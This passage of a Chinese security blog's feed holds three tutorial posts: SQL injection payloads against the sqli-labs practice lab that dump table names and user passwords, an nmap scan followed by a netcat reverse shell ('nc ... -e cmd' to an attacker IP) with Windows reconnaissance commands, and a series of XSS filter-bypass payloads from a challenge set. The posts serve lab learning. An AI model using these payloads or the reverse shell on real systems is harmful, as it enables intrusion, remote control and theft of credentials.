class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=-1&quot;) union select 1,database(),3--+</span><br></pre></td></tr></table></figure></li><li><p>[库名 ] 发现库名为security</p></li><li><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p>查用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3></li></ul><blockquote><p>使用报错注入，主要是能够得到闭合方式，但是不显示报错位</p></blockquote><ul><li>查看闭合方式：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/index.php?id=1\</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/29d58b8dc5a841b0bbf15ee02e7d1a90.png#pic_center" alt="报错位置"></li></ul><blockquote><p>通过尝试，用联合查询在出现报错位时候没有页面显示报错位，所以可以尝试报错z注入<br>查询数据库库名</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/index.php?id=1&quot; or extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br></pre></td></tr></table></figure><ul><li>查表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/index.php?id=1&quot; or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e)) --+</span><br></pre></td></tr></table></figure><blockquote><p>差表明中从limit 0,1 开始查，直到读取完所有的表</p></blockquote></li><li>查列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/index.php?id=1&quot; or extractvalue(1,concat(0x7e,(select column_name from information_schema.tables where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure><blockquote><p>发现有三列，分别为id username password </p></blockquote></li><li>查用户信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/index.php?id=1&quot; or extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)) --+</span><br></pre></td></tr></table></figure><h3 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h3><blockquote><p>原理其实和联合查询一样的，就是形式有稍微差别</p></blockquote></li><li>查看库名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases; --+</span><br></pre></td></tr></table></figure></li><li>查看表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br></pre></td></tr></table></figure></li><li>查看栏目<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ;show columns from `users`; --+</span><br></pre></td></tr></table></figure></li><li>查看最终信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; </span><br></pre></td></tr></table></figure><h3 id="盲注原理："><a href="#盲注原理：" class="headerlink" title="盲注原理："></a>盲注原理：</h3><blockquote><p>通过不断对数据库的内容进行猜测，发现他是错误还是正确</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(database())</span><br></pre></td></tr></table></figure>显示数据库库名的字数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dababase()</span><br></pre></td></tr></table></figure>显示数据库库名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(),1,1)</span><br></pre></td></tr></table></figure>截取数据库库名第一个字<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(database(),1,1))</span><br></pre></td></tr></table></figure>把截取的字转为ascci码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(database()1,1))=110</span><br></pre></td></tr></table></figure>判断其第一个字的asccii是不是110</li></ul><ul><li>判断库名：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select ascii(substr(database(),1,1)) &gt; 100 ) --+</span><br></pre></td></tr></table></figure></li><li>判断表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 ) --+</span><br></pre></td></tr></table></figure><h3 id="随笔："><a href="#随笔：" class="headerlink" title="随笔："></a>随笔：</h3>在解决SQL中还会有很多的问题出现，可能那些语句会被过滤掉，有大小写绕过，双写绕过等，对一些字符型的过滤可以考虑换形式，也可进行urlb编码等，更多理解，请关注我的随笔</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SQL注入&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞" scheme="http://xzajyjs2.ltd/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sql注入" scheme="http://xzajyjs2.ltd/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>nmap配合nc</title>
    <link href="http://xzajyjs2.ltd/2021/08/01/nc%20and%20nmap/"/>
    <id>http://xzajyjs2.ltd/2021/08/01/nc%20and%20nmap/</id>
    <published>2021-08-01T10:23:38.000Z</published>
    <updated>2021-08-09T16:42:32.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nmap配合nc拿到cmd权限"><a href="#nmap配合nc拿到cmd权限" class="headerlink" title="nmap配合nc拿到cmd权限"></a>nmap配合nc拿到cmd权限</h2><span id="more"></span><h3 id="第一步-在内网进行nmap扫描"><a href="#第一步-在内网进行nmap扫描" class="headerlink" title="第一步:在内网进行nmap扫描"></a>第一步:在内网进行nmap扫描</h3><ul><li><strong><code>nmap -sn 1/24 （直接跳过主机发现)</code></strong>(可以扫描内网情况,mac地址)</li><li><img src="https://img-blog.csdnimg.cn/2021073100483628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzOTQ3Nzgw,size_16,color_FFFFFF,t_70" alt="可以扫描内网情况,mac地址"><h2 id="第二步-确定目标：nmap-sS-【目标IP】-隐秘扫描"><a href="#第二步-确定目标：nmap-sS-【目标IP】-隐秘扫描" class="headerlink" title="第二步:确定目标：nmap -sS 【目标IP】(隐秘扫描)"></a>第二步:确定目标：nmap -sS 【目标IP】(隐秘扫描)</h2></li><li><code>**nmap -sS 192.168.203.144**</code><br><img src="https://img-blog.csdnimg.cn/20210731005049507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzOTQ3Nzgw,size_16,color_FFFFFF,t_70" alt="隐秘扫描:可以得出端口信息"></li></ul><h2 id="第三步-黑客用nc-exe监听自己端口4444："><a href="#第三步-黑客用nc-exe监听自己端口4444：" class="headerlink" title="第三步:黑客用nc.exe监听自己端口4444："></a>第三步:黑客用nc.exe监听自己端口4444：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 4444</span><br></pre></td></tr></table></figure><h2 id="第四步-服务端主动连接黑客："><a href="#第四步-服务端主动连接黑客：" class="headerlink" title="第四步:服务端主动连接黑客："></a>第四步:服务端主动连接黑客：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv [黑客IP] 4444  -e cmd (如果是linux为-c bash)</span><br></pre></td></tr></table></figure><h3 id="控制cmd后进行信息收集"><a href="#控制cmd后进行信息收集" class="headerlink" title="控制cmd后进行信息收集:"></a>控制cmd后进行信息收集:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">whoami 查看自己身份</span><br><span class="line"> </span><br><span class="line">whoami /all 获取当前域的信息</span><br><span class="line"> </span><br><span class="line">ipconfig /all 查看详细ip信息</span><br><span class="line"> </span><br><span class="line">arp -a 查看arp表</span><br><span class="line"> </span><br><span class="line">systeminfo 查看操作系统信息</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE% 查看cpu型号</span><br><span class="line"> </span><br><span class="line">wmic product get name,version 查看安装软件和版本信息</span><br><span class="line"> </span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn 查看补丁列表</span><br><span class="line"> </span><br><span class="line">net user 查看本地用户</span><br><span class="line"> </span><br><span class="line">net session 显示本地和远程的会话</span><br><span class="line"> </span><br><span class="line">wmic process list brief 查看进程</span><br><span class="line"></span><br><span class="line">net view 查看内网的共享</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意,此次的nc 为反向连接,实战需要配合控制程序,以后多多更新,谢谢支持,第一次写博客,多多包含</strong></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;nmap配合nc拿到cmd权限&quot;&gt;&lt;a href=&quot;#nmap配合nc拿到cmd权限&quot; class=&quot;headerlink&quot; title=&quot;nmap配合nc拿到cmd权限&quot;&gt;&lt;/a&gt;nmap配合nc拿到cmd权限&lt;/h2&gt;</summary>
    
    
    
    
    <category term="信息收集" scheme="http://xzajyjs2.ltd/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="nc" scheme="http://xzajyjs2.ltd/tags/nc/"/>
    
    <category term="windows命令" scheme="http://xzajyjs2.ltd/tags/windows%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞利用</title>
    <link href="http://xzajyjs2.ltd/2020/08/04/xss/"/>
    <id>http://xzajyjs2.ltd/2020/08/04/xss/</id>
    <published>2020-08-03T16:00:00.000Z</published>
    <updated>2021-08-10T07:46:28.907Z</updated>
    
    <content type="html"><![CDATA[<p>xss漏洞利用</p><span id="more"></span><p>============</p><h3 id="简要概述"><a href="#简要概述" class="headerlink" title="简要概述:"></a>简要概述:</h3><pre><code>实验主要通过在代码中存在的一些漏洞进行成功绕过,利用xss的漏洞去除代码的审查xss漏洞有很多形式绕过,比如 :换行,标签符号的补全,注释意义等,可根据实际情况而定注意,xss漏利用成功是在屏幕中出现弹窗,在javascript中alert函数就是出现弹窗.标准的执行命令&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><hr><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><ul><li>这个没有过滤任何内容，直接标准命令执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4></li><li>加上了<code>&lt;texetarea&gt;&lt;/texearea&gt;</code>,直接把前半部分标签闭合，后半部分可以不用考虑(这是这种标签的特性)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4></li><li>加上了<code>&lt;input&gt;</code>标签，并且输入值在value里面，可以先使用双引号闭合内部，在闭合waibu<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4></li><li>过滤掉了括号，但可以用反引号代替<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4></li><li>这个题把括号反引号都过滤掉了，直接把左括号，右括号分别进行unicode加密，再用<code>&lt;svg&gt;</code>标签进行标示<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4></li><li>这个题加入的内容会在注意符里面，直接把前面注释符闭合掉<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4></li><li>这个会把=前面的内容变成_,可以直接进行换行绕过，因为换行本身就是一种符号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h4></li><li>这个题目中出现了&lt;&gt;后里面内容无法直接替换为空，可以直接用img标签触发<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4></li><li>这个题中会把</style>变为字符，所以可以直接换行绕过，加上了style标签，可以直接把前面闭合掉<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h4></li><li>此题必须输入<a href="http://www.haha.com才会显示内容又加上了`/">http://www.haha.com才会显示内容又加上了`</a><script></script>`<br>标签，可以先闭合前面的script标签，再用img标签zhix<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.haha.com&quot;&gt;&lt;/script&gt;&lt;img src=x onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure><h4 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h4></li><li>这个题目把&amp;  ‘  “ &lt;  &gt; / 进行了转化，还还加上了input标签，可以在自己的电脑上搭建网页方式执行，名字为abc.js</li><li>自己网页代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alrt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li>执行端代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.haha.com@127.0.0.1/abc.js</span><br></pre></td></tr></table></figure><h4 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h4></li><li>把小写变成了大写(和上一题类同)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h4></li><li>script会被替代，直接双写过滤掉，大小写转换，可以直接通过远程执行来滤过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt src=&quot;127.0.0.1/abc.js&quot;&gt;&lt;scriscriptpt&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h4></li><li>把&lt;  ‘  “  /替换为空，中间加上注释标签，首尾加上了script标签(<strong>下面代码有换行</strong>)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h4></li><li>注意，下面那个符号为长S<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h4></li></ul><h4 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h4><ul><li>加上了script标签，直接先把前部分标签闭合掉了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure><h4 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure><h4 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h4></li><li>先把出现的/进行转义<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;);alert(1)//</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;xss漏洞利用&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞" scheme="http://xzajyjs2.ltd/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="代码理解" scheme="http://xzajyjs2.ltd/tags/%E4%BB%A3%E7%A0%81%E7%90%86%E8%A7%A3/"/>
    
  </entry>
  
</feed>
